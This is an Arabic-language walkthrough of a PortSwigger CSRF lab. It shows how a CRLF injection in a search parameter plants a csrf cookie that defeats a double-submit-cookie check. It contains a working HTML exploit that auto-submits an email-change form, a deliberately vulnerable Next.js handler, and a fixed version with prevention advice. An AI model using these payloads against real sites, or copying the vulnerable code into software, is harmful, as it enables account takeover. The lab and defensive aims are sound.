# Lab: CSRF where token is duplicated in cookie

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يستخدم تقنية **Double Submit Cookie** غير الآمنة، حيث يتم مقارنة التوكن المرسل في الـ Body مع التوكن الموجود في الـ Cookie. يمكننا حقن كوكي بقيمة نعرفها ثم استخدام نفس القيمة كتوكن.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: فهم آلية Double Submit Cookie

عند تغيير البريد، يظهر طلب مثل هذا:

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=SESSION_ID; csrf=TOKEN_IN_COOKIE

email=test@test.com&csrf=TOKEN_IN_BODY
```

**آلية التحقق:** الخادم يقارن قيمة `csrf` في الـ Body مع قيمة `csrf` في الـ Cookie. إذا تطابقتا، يمر الطلب.

### الخطوة 2: إيجاد طريقة لحقن كوكي في متصفح الضحية

نلاحظ أن خاصية **البحث (Search)** تعكس المدخلات في `Set-Cookie`:

```http
GET /?search=test HTTP/1.1
```

الرد يحتوي على:
```
Set-Cookie: search=test; SameSite=None
```

نستغل هذا لحقن كوكي `csrf` بقيمة نختارها (مثلاً `fake`):

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

### الخطوة 3: إنشاء HTML للهجوم

سنقوم بـ:
1. حقن كوكي `csrf=fake` في متصفح الضحية
2. ثم تنفيذ طلب تغيير البريد مع إرسال `csrf=fake` في الـ Body

```html
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit()">

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim%40attacker.net">
    <input type="hidden" name="csrf" value="fake">
</form>

<script>
    // الصورة تحقن الكوكي، ثم عند فشلها (onerror) يتم إرسال الفورم
</script>
```

### الخطوة 4: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML
- اضغط **Store**

### الخطوة 5: تجربة الهجوم على نفسك

- اضغط **View exploit**
- تحقق من أن بريدك الإلكتروني تغير

### الخطوة 6: تسليم الهجوم للضحية

- اضغط **Deliver to victim**
- تم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي تقنية Double Submit Cookie؟** | مقارنة التوكن في الـ Body مع التوكن في الـ Cookie |
| **لماذا هي غير آمنة؟** | إذا استطعنا حقن كوكي في متصفح الضحية، يمكننا تجاوز الحماية |
| **كيف حقنّا الكوكي؟** | باستخدام ثغرة CRLF Injection في وظيفة البحث |
| **ماذا يفعل `onerror`؟** | الصورة تفشل في التحميل، ثم يتم إرسال الفورم |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. استخدام تقنية **Double Submit Cookie** غير الآمنة
2. وجود ثغرة **CRLF Injection** تسمح بحقن كوكي

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// وظيفة البحث - فيها CRLF Injection
export default function searchHandler(req, res) {
  const { search } = req.query;
  // خطير: يعكس المدخلات مباشرة في Set-Cookie
  res.setHeader('Set-Cookie', `search=${search}; SameSite=None`);
  res.send(`Search results for: ${search}`);
}

// وظيفة تغيير البريد - Double Submit Cookie
export default function emailHandler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId, csrf: csrfCookie } = req.cookies;
  
  // خطأ: يقارن التوكن في الـ Body مع التوكن في الـ Cookie
  if (!csrfCookie || csrf !== csrfCookie) {
    return res.status(403).send('CSRF token mismatch');
  }
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// وظيفة البحث - إصلاح CRLF Injection
export default function searchHandler(req, res) {
  let { search } = req.query;
  
  // إزالة أي أحرف خطيرة
  search = search.replace(/[\r\n]/g, '');
  const safeSearch = encodeURIComponent(search);
  
  res.setHeader('Set-Cookie', `search=${safeSearch}; SameSite=None`);
  res.send(`Search results for: ${escapeHtml(search)}`);
}

// وظيفة تغيير البريد - استخدام CSRF Token مربوط بالجلسة
const sessionTokens = new Map(); // sessionId -> token

export default function emailHandler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId } = req.cookies;
  
  // التحقق من أن التوكن يخص هذه الجلسة
  const expectedToken = sessionTokens.get(sessionId);
  if (!expectedToken || expectedToken !== csrf) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  sessionTokens.delete(sessionId); // single-use
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

**الخلاصة:** 
1. لا تستخدم Double Submit Cookie، استخدم CSRF Token مربوط بالجلسة
2. امنع CRLF Injection في أي مكان يعكس مدخلات المستخدم

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **استخدام CSRF Token مربوط بالجلسة:** لا تعتمد على مقارنة الكوكيز.
2. **منع CRLF Injection:** ارفض أو قم بتشفير `\r` و `\n`.
3. **استخدام SameSite=Lax أو Strict:** كطبقة دفاع إضافية.
4. **استخدام `HttpOnly` للكوكيز:** لمنع سرقتها عبر XSS (رغم أنها لا تمنع CSRF).

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
- [Double Submit Cookie](https://portswigger.net/web-security/csrf/bypassing-same-site-restrictions)
